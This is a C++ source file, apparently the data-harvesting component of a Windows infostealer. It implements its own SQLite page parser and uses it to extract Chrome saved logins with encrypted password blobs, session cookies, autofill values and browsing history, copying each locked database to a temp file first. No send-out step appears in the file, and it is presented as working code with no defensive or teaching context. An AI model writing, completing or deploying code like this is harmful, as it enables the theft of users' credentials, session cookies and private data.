#include <windows.h>
#include <vector>
#include <string>
#include <cstring>
#include <fstream>
#include <tuple>
#include "logger/file_logger.h"

#define SQLITE_HEADER_SIZE 100
#define SQLITE_BTREE_LEAF_TABLE 0x0D
#define SQLITE_BTREE_INTERIOR_TABLE 0x05

class MinimalSQLiteReader {
private:
    std::vector<uint8_t> database;
    uint16_t page_size;

public:
    bool LoadDatabase(const std::wstring& path) {
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        std::wstring tempDb = std::wstring(tempPath) + L"tmp_" + std::to_wstring(GetTickCount()) + L".db";

        if (!CopyFileW(path.c_str(), tempDb.c_str(), FALSE)) {
            LogError("[SQLite] Failed to copy file");
            return false;
        }

        HANDLE hFile = CreateFileW(tempDb.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            DeleteFileW(tempDb.c_str());
            LogError("[SQLite] Failed to open temp file");
            return false;
        }

        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        database.resize(static_cast<size_t>(fileSize.QuadPart));

        DWORD bytesRead;
        ReadFile(hFile, database.data(), (DWORD)database.size(), &bytesRead, NULL);
        CloseHandle(hFile);
        DeleteFileW(tempDb.c_str());

        if (database.size() < SQLITE_HEADER_SIZE || memcmp(database.data(), "SQLite format 3\0", 16) != 0) {
            LogError("[SQLite] Invalid header");
            return false;
        }

        page_size = (database[16] << 8) | database[17];
        if (page_size == 1) page_size = 65536;

        LogInfo("[SQLite] Database loaded successfully");
        return true;
    }

    bool FindTableRootPage(const std::string& tableName, uint32_t& rootPage) {
        std::vector<std::vector<std::vector<uint8_t>>> masterRows;
        ParseBTreePage(1, masterRows);
        for (const auto& row : masterRows) {
            if (row.size() >= 5) {
                std::string name(row[1].begin(), row[1].end());
                if (name == tableName) {
                    rootPage = 0;
                    for (size_t i = 0; i < row[3].size() && i < 4; i++) {
                        rootPage = (rootPage << 8) | row[3][i];
                    }
                    return true;
                }
            }
        }
        return false;
    }

    std::vector<std::vector<std::vector<uint8_t>>> ExtractTable(uint32_t rootPage) {
        std::vector<std::vector<std::vector<uint8_t>>> rows;
        ParseBTreePage(rootPage, rows);
        return rows;
    }

private:
    void ParseBTreePage(uint32_t pageNum, std::vector<std::vector<std::vector<uint8_t>>>& rows) {
        if (pageNum == 0 || pageNum > database.size() / page_size) return;

        uint32_t offset = (pageNum - 1) * page_size;
        if (offset >= database.size()) return;

        uint8_t pageType = database[offset];

        if (pageType == SQLITE_BTREE_LEAF_TABLE) {
            uint16_t numCells = (database[offset + 3] << 8) | database[offset + 4];
            std::vector<uint16_t> cellPointers;
            for (uint16_t i = 0; i < numCells; i++) {
                uint16_t ptrOffset = offset + 8 + (i * 2);
                if (ptrOffset + 1 < database.size()) {
                    uint16_t cellOffset = (database[ptrOffset] << 8) | database[ptrOffset + 1];
                    cellPointers.push_back(cellOffset);
                }
            }
            for (uint16_t cellOffset : cellPointers) {
                auto row = ParseCell(offset + cellOffset);
                if (!row.empty()) rows.push_back(row);
            }
        } else if (pageType == SQLITE_BTREE_INTERIOR_TABLE) {
            uint16_t numCells = (database[offset + 3] << 8) | database[offset + 4];
            for (uint16_t i = 0; i < numCells; i++) {
                uint16_t ptrOffset = offset + 12 + (i * 2);
                if (ptrOffset + 1 < database.size()) {
                    uint16_t cellOffset = (database[ptrOffset] << 8) | database[ptrOffset + 1];
                    uint32_t childOffset = offset + cellOffset;
                    if (childOffset + 4 < database.size()) {
                        uint32_t childPage = 0;
                        for (int j = 0; j < 4; j++) {
                            childPage = (childPage << 8) | database[childOffset + j];
                        }
                        ParseBTreePage(childPage, rows);
                    }
                }
            }
            uint32_t rightChildOffset = offset + 8;
            if (rightChildOffset + 3 < database.size()) {
                uint32_t rightChild = 0;
                for (int i = 0; i < 4; i++) {
                    rightChild = (rightChild << 8) | database[rightChildOffset + i];
                }
                if (rightChild > 0) {
                    ParseBTreePage(rightChild, rows);
                }
            }
        }
    }

    std::vector<std::vector<uint8_t>> ParseCell(uint32_t offset) {
        std::vector<std::vector<uint8_t>> fields;
        if (offset >= database.size()) return fields;

        uint64_t payloadSize = 0;
        int bytes = ReadVarint(offset, payloadSize);
        offset += bytes;

        uint64_t rowid = 0;
        bytes = ReadVarint(offset, rowid);
        offset += bytes;

        uint32_t payloadStart = offset;

        uint64_t headerSize = 0;
        bytes = ReadVarint(offset, headerSize);
        uint32_t headerStart = offset;
        offset += bytes;

        std::vector<uint64_t> serialTypes;
        while (offset < headerStart + headerSize && offset < database.size()) {
            uint64_t type = 0;
            bytes = ReadVarint(offset, type);
            offset += bytes;
            serialTypes.push_back(type);
        }

        offset = payloadStart + headerSize;

        for (uint64_t type : serialTypes) {
            std::vector<uint8_t> field;

            if (type == 0) {}
            else if (type >= 1 && type <= 6) {
                int size = (type == 5) ? 6 : (type == 6 ? 8 : (int)type);
                if (offset + size <= database.size()) {
                    field.insert(field.end(), database.begin() + offset, database.begin() + offset + size);
                    offset += size;
                }
            } else if (type == 7) {
                if (offset + 8 <= database.size()) {
                    field.insert(field.end(), database.begin() + offset, database.begin() + offset + 8);
                    offset += 8;
                }
            } else if (type == 8) {
                field.push_back(0);
            } else if (type == 9) {
                field.push_back(1);
            } else if (type >= 12 && type % 2 == 0) {
                int size = (int)(type - 12) / 2;
                if (offset + size <= database.size()) {
                    field.insert(field.end(), database.begin() + offset, database.begin() + offset + size);
                    offset += size;
                }
            } else if (type >= 13 && type % 2 == 1) {
                int size = (int)(type - 13) / 2;
                if (offset + size <= database.size()) {
                    field.insert(field.end(), database.begin() + offset, database.begin() + offset + size);
                    offset += size;
                }
            }

            fields.push_back(field);
        }

        return fields;
    }

    int ReadVarint(uint32_t offset, uint64_t& value) {
        value = 0;
        int bytes = 0;
        for (int i = 0; i < 9; i++) {
            if (offset + i >= database.size()) break;
            uint8_t byte = database[offset + i];
            if (i < 8) value |= (uint64_t)(byte & 0x7F) << (7 * i);
            else value |= (uint64_t)byte << 56;
            bytes++;
            if ((byte & 0x80) == 0) break;
        }
        return bytes;
    }
};

std::string BytesToString(const std::vector<uint8_t>& bytes) {
    return std::string(bytes.begin(), bytes.end());
}

int64_t BytesToInt(const std::vector<uint8_t>& bytes) {
    if (bytes.empty()) return 0;
    int64_t value = 0;
    for (size_t i = 0; i < bytes.size() && i < 8; i++) {
        value = (value << 8) | bytes[i];
    }
    return value;
}
std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>>>
ExtractChromePasswordsMinimal(const std::wstring& loginDataPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>>> results;

    std::string pathStr(loginDataPath.begin(), loginDataPath.end());
    LogInfo(("[SQLite] Extracting Chrome passwords from: " + pathStr).c_str());

    if (!reader.LoadDatabase(loginDataPath)) {
        LogError("[SQLite] Failed to load database for passwords");
        return results;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("logins", rootPage)) {
        LogError("[SQLite] 'logins' table not found");
        return results;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 3) {
            std::string url(row[0].begin(), row[0].end());
            std::string username(row[1].begin(), row[1].end());
            std::vector<uint8_t> encryptedPassword = row[2];
            LogInfo(("[SQLite] Captured login for: " + url).c_str());
            results.emplace_back(url, username, encryptedPassword);
        }
    }

    return results;
}

std::vector<std::tuple<std::string, std::string, std::string>>
ExtractChromeCookiesMinimal(const std::wstring& cookieDbPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, std::string, std::string>> cookies;

    std::string pathStr(cookieDbPath.begin(), cookieDbPath.end());
    LogInfo(("[SQLite] Extracting Chrome cookies from: " + pathStr).c_str());

    if (!reader.LoadDatabase(cookieDbPath)) {
        LogError("[SQLite] Failed to load database for cookies");
        return cookies;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("cookies", rootPage)) {
        LogError("[SQLite] 'cookies' table not found");
        return cookies;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 3) {
            std::string host(row[0].begin(), row[0].end());
            std::string name(row[1].begin(), row[1].end());
            std::string value(row[2].begin(), row[2].end());
            LogInfo(("[SQLite] Cookie for host: " + host + " name: " + name).c_str());
            cookies.emplace_back(host, name, value);
        }
    }

    return cookies;
}

std::vector<std::tuple<std::string, std::string>>
ExtractChromeAutofillMinimal(const std::wstring& webDataPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, std::string>> autofill;

    std::string pathStr(webDataPath.begin(), webDataPath.end());
    LogInfo(("[SQLite] Extracting Chrome autofill from: " + pathStr).c_str());

    if (!reader.LoadDatabase(webDataPath)) {
        LogError("[SQLite] Failed to load database for autofill");
        return autofill;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("autofill", rootPage)) {
        LogError("[SQLite] 'autofill' table not found");
        return autofill;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 2) {
            std::string name(row[0].begin(), row[0].end());
            std::string value(row[1].begin(), row[1].end());
            LogInfo(("[SQLite] Autofill field: " + name).c_str());
            autofill.emplace_back(name, value);
        }
    }

    return autofill;
}

std::vector<std::tuple<std::string, int>>
ExtractChromeHistoryMinimal(const std::wstring& historyDbPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, int>> history;

    std::string pathStr(historyDbPath.begin(), historyDbPath.end());
    LogInfo(("[SQLite] Extracting Chrome history from: " + pathStr).c_str());

    if (!reader.LoadDatabase(historyDbPath)) {
        LogError("[SQLite] Failed to load database for history");
        return history;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("urls", rootPage)) {
        LogError("[SQLite] 'urls' table not found");
        return history;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 2) {
            std::string url(row[0].begin(), row[0].end());
            int count = row[1].empty() ? 0 : row[1][0];
            LogInfo(("[SQLite] Visited URL: " + url).c_str());
            history.emplace_back(url, count);
        }
    }

    return history;
}
